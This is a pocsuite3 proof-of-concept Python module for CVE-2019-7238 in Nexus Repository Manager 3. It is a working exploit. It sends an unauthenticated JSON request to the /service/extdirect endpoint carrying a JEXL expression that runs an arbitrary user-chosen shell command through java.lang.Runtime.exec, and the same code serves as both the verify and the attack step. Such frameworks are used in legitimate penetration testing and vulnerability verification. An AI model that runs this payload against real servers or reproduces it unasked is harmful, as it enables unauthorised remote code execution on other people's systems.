"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

from collections import OrderedDict

from pocsuite3.api import Output
from pocsuite3.api import POCBase
# from pocsuite3.api import OptDict
from pocsuite3.api import requests
from pocsuite3.api import OptString
from pocsuite3.api import register_poc
from pocsuite3.api import POC_CATEGORY


class DemoPOC(POCBase):
	vulID = '97809'  # ssvid
	version = '1.0'
	author = ['Knownsec']
	vulDate = '2019-02-05'
	createDate = '2019-02-15'
	updateDate = '2019-02-15'
	references = ['https://www.seebug.org/vuldb/ssvid-97809']
	name = 'Nexus Repository Manager 3 访问控制缺失及远程代码执行漏洞(CVE-2019-7238)'
	appPowerLink = 'https://oss.sonatype.org/'
	appName = 'Nexus Repository Manager'
	appVersion = '3.6.2 版本到 3.14.0 版本'
	vulType = 'code-exec'
	desc = '''
		Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等
		软件源仓库。其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式
		执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。
	'''
	samples = ['http://10.10.100.92:8081/']
	install_requires = []
	category = POC_CATEGORY.EXPLOITS.WEBAPP
	protocol = POC_CATEGORY.PROTOCOL.HTTP


	def _options(self):
		o = OrderedDict()
		o["command"] = OptString('touch /tmp/success', description='这个poc需要用户输入执行命令', require=True)
		return o

	def _verify(self):
		result = {}
		playload = '''
			{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('%s')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}
			''' % self.get_option("command")
		# print('>>>'+playload)
		# playload = '''{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('ls')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}'''
		get_headers = {
				'Proxy-Connection': 'keep-alive',
				'X-Requested-With': 'XMLHttpRequest',
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
				'Accept': '*/*',
				'Content-Type': 'application/json'
			}
		vul_url = self.url

		if vul_url.endswith('/'):
			vul_url = vul_url[:-1]

		if "http://" in vul_url:
			host = vul_url[7:]
		elif "https://" in vul_url:
			host = vul_url[8:]
		else:
			host = vul_url

		get_headers['Host'] = host
		vul_url = vul_url + '/service/extdirect'

		r = requests.post(url=vul_url, data=playload, headers=get_headers)

		if r.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['content'] = r.content

		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

register_poc(DemoPOC)